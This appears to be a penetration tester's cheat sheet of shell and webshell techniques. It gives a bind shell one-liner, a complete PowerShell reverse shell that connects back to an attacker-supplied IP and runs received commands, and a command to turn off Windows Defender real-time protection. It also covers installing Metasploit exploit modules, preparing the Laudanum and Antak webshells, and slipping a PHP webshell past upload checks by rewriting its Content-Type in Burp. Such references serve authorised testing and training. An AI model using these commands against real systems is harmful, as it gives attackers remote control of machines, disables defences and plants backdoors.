Â [Reverse Shell Cheat Sheet](https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/Methodology%20and%20Resources/Reverse%20Shell%20Cheatsheet.md)

### Bind Shell
- On target:
	- `rm -f /tmp/f; mkfifo /tmp/f; cat /tmp/f | /bin/bash -i 2>&1 | nc -l <IP> <PORT> > /tmp/f`
- On attacker:
	- `nc -nv <IP> <PORT>`

### Reverse Shell
**Windows**
- On attacker:
	- `nc -nvlp <PORT>`
- On target:
```cmd
powershell -nop -c "$client = New-Object System.Net.Sockets.TCPClient('<IP>',<PORT>);$stream = $client.GetStream();[byte[]]$bytes = 0..65535|%{0};while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0){;$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i);$sendback = (iex $data 2>&1 | Out-String );$sendback2 = $sendback + 'PS ' + (pwd).Path + '> ';$sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);$stream.Write($sendbyte,0,$sendbyte.Length);$stream.Flush()};$client.Close()"
```
- This will likely get caught by AV. To disable AV
	- PowerShell: `Set-MpPreference -DisableRealtimeMonitoring $true`

## Adding Exploits to Metasploit
- Metasploit hosts exploit modules on their [github](https://github.com/rapid7/metasploit-framework/tree/master/modules/exploits) that may not be installed locally
- Alternatively, we can google `"<exploit name> metasploit github"`
- Once we find and download it we find our exploit directory with `locate exploits`
- We can then copy the `.rb` exploit we downloaded into the appropriate subfolder


## [Laudanum Webshell Repo](https://github.com/jbarcia/Web-Shells/tree/master/laudanum)
- Can be found on Parrot in `/usr/share/webshells/laudanum`
- The webshells require modification for callback IP and should be stripped of art and comments

## Antak Webshell
- ASP.Net webshell from [Nishang](https://github.com/samratashok/nishang)
- PowerShell like
- On ParrotOS found in `/usr/share/nishang/Antak-Webshell/`
- Executes each command as a new process
- Modify for use by setting the username and password and removing comments


## Bypass File Type with Burp for PHP Webshell
- [WhiteWinterWolf PHP WebShell](https://github.com/WhiteWinterWolf/wwwolf-php-webshell)
- Catch the POST request in Burp and change the Content-type from `application/x-php` to `image/gif`